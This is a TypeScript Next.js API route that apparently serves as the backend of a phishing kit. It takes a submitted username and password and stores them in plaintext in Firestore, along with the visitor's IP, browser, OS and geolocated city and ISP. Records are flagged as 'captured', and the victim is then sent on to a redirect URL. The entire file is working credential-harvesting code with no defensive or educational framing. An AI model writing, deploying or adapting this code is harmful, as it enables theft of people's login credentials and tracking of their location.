import { increment, updateDoc } from "firebase/firestore";
import { getDoc, doc, setDoc } from "firebase/firestore";
import { NextResponse } from "next/server";
import config, { db } from "@/config";
import UAParser from "ua-parser-js";
import { v4 as uuid } from "uuid";

export async function POST(req: Request) {
  const data = await req.json();
  const userAgent = new UAParser(String(req.headers.get("user-agent")));
  const { url } = config;

  // User Info
  const ip = req.headers.get("x-forwarded-for") || "N/A";
  const browser = userAgent.getBrowser();
  const os = userAgent.getOS();
  const ipRes = await fetch(`http://ip-api.com/json/${ip}`, { method: "GET" });
  const ipData = await ipRes.json();

  const info = {
    id: uuid(),
    username: data.username,
    password: data.password,
    captureDate: data.date,
    browser: `${browser.name} ${browser.version}`,
    ip: ip,
    os: `${os.name} ${os.version}`,
    country: ipData.status === "success" ? ipData.country : "N/A",
    countryCode: ipData.status === "success" ? ipData.countryCode : "N/A",
    city: ipData.status === "success" ? ipData.city : "N/A",
    isp: ipData.status === "success" ? ipData.isp : "N/A",
    captured: true,
    read: true,
    clicks: 0,
    visits: 0,
  };

  try {
    const docRef = doc(db, "users", info.id);

    if ((await getDoc(docRef)).exists()) {
      await updateDoc(docRef, { clicks: increment(1) });
      return NextResponse.json({
        status: "success",
        redirect: url.redirect,
      });
    }

    await setDoc(docRef, info);

    return NextResponse.json({
      status: "success",
      redirect: url.redirect,
    });
  } catch (e) {
    console.error("Error adding document: ", e);
    return NextResponse.json(
      { status: "fail", redirect: url.redirect },
      { status: 401 }
    );
  }
}
